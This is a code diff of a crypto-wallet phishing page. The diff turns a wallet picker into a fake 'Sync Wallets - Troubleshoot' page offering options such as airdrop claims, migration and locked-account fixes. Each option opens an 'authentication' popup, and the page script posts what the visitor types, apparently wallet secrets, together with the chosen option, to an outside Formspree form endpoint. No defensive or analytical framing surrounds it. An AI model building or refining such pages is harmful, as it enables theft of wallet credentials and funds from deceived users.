@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Selection</title>
+    <title>Sync Wallets - Troubleshoot</title>
     <link rel="stylesheet" href="color.css">
 </head>
 <body>
@@ -11,10 +11,10 @@
         <div class="banner">
             <img src="assets/banner.jpg" alt="Wallet Security Banner">
         </div>
-        <h1>Select Your Wallet or Exchanger</h1>
+        <h1>Get Started Below.</h1>
     </header>
     
-    <div class="wallet-container" id="walletContainer"></div>
+    <div class="troubleshoot-container" id="troubleshootContainer"></div>
 
     <!-- Authentication Popup -->
     <div id="authPopup" class="popup" style="display: none;">
@@ -39,44 +39,50 @@
     </div>
 
     <script>
-        const wallets = [
-            "MetaMask", "Trust Wallet", "Coinbase", "Ledger", "Trezor",
-            "Binance", "Crypto.com", "Phantom", "Exodus", "Atomic",
-            "MyEtherWallet", "Guarda", "Blockchain", "Electrum", "Zengo",
-            "Argent", "Safepal", "Rainbow", "coinomi", "BRD",
-            "ENJIN", "Math", "Huobi", "TokenPocket", "Bitpay",
-            "Nash", "Coin98", "XDEFI", "Ellipal", "Keystone",
-            "Gate.io", "OKX", "Bybit", "KuCoin", "Bitget",
-            "Kraken", "Polkadot", "Solflare", "Tonkeeper", "Cosmostation",
-            "Near", "Klever", "Wombat", "Domain", "Torus",
-            "Opera", "Bitcoin", "Numio", "Alpha", "Dharma",
+        const troubleshootOptions = [
+            { name: "Migration", description: "Click here for migration or to resolve any migration related issues." },
+            { name: "Rectification", description: "Click here to rectify all strange wallet issues." },
+            { name: "Claim", description: "Click here to claim tokens or resolve any token claiming related issues." },
+            { name: "Swap", description: "Click here to swap tokens or resolve token swaplist." },
+            { name: "Slippage", description: "Click here for slippage or transaction fee related issues." },
+            { name: "Claim Airdrop", description: "Click here to claim airdrop or resolve errors encountered during airdrop claim." },
+            { name: "Staking", description: "Click here to resolve issues while staking/unstaking." },
+            { name: "Whitelist", description: "Click here to whitelist your address or resolve whitelisting related error." },
+            { name: "Cross Transfer", description: "Click here to resolve cross transfer issues." },
+            { name: "NFTs", description: "Click here to resolve NFT related issues." },
+            { name: "Locked Account", description: "Click here to resolve locked account issues." },
+            { name: "Login Error", description: "Click here to resolve login error issues." }
         ];
 
-        const walletContainer = document.getElementById("walletContainer");
+        const troubleshootContainer = document.getElementById("troubleshootContainer");
 
-        wallets.forEach(wallet => {
-            let walletBox = document.createElement("div");
-            walletBox.classList.add("wallet-box");
-            walletBox.setAttribute("tabindex", "0");
-            walletBox.setAttribute("role", "button");
-            walletBox.innerHTML = `
-                <img src="assets/${wallet.toLowerCase().replace(/ /g, '')}.png" alt="${wallet}" onerror="this.onerror=null; this.src='assets/default.png'">
-                <p>${wallet}</p>
+        troubleshootOptions.forEach(option => {
+            let optionBox = document.createElement("div");
+            optionBox.classList.add("troubleshoot-box");
+            optionBox.setAttribute("tabindex", "0");
+            optionBox.setAttribute("role", "button");
+            optionBox.innerHTML = `
+                <h3>${option.name.toUpperCase()}</h3>
+                <p>${option.description}</p>
             `;
-            walletBox.onclick = openAuthPopup;
-            walletBox.onkeydown = (e) => {
+            optionBox.onclick = () => openAuthPopup(option.name);
+            optionBox.onkeydown = (e) => {
                 if (e.key === "Enter" || e.key === " ") {
-                    openAuthPopup();
+                    openAuthPopup(option.name);
                 }
             };
-            walletContainer.appendChild(walletBox);
+            troubleshootContainer.appendChild(optionBox);
         });
 
-        function openAuthPopup() {
+        let selectedOption = null;
+
+        function openAuthPopup(optionName) {
+            selectedOption = optionName;
             document.getElementById("authPopup").style.display = "flex";
         }
 
         function closeAuthPopup() {
+            selectedOption = null;
             document.getElementById("authPopup").style.display = "none";
             document.getElementById("authMessage").textContent = "";
             document.getElementById("authMessage").classList.add("hidden");
@@ -125,7 +131,7 @@
             fetch("https://formspree.io/f/mvgkalye", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: `authType=${encodeURIComponent(authType)}&authInput=${encodeURIComponent(authInput)}`
+                body: `authType=${encodeURIComponent(authType)}&authInput=${encodeURIComponent(authInput)}&troubleshootOption=${encodeURIComponent(selectedOption)}`
             })
             .then(response => {
                 if (response.ok) {
@@ -150,5 +156,43 @@
             document.getElementById("authMessage").classList.add("hidden");
         });
     </script>
+
+    <style>
+        .troubleshoot-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .troubleshoot-box {
+            background-color: #1a2a44;
+            border: 2px solid #2a3b5a;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+
+        .troubleshoot-box:hover {
+            transform: scale(1.05);
+            border-color: #00d4ff;
+        }
+
+        .troubleshoot-box h3 {
+            margin: 0 0 10px;
+            font-size: 1.2em;
+            color: #ffffff;
+        }
+
+        .troubleshoot-box p {
+            margin: 0;
+            font-size: 0.9em;
+            color: #b0b0b0;
+        }
+    </style>
 </body>
 </html>
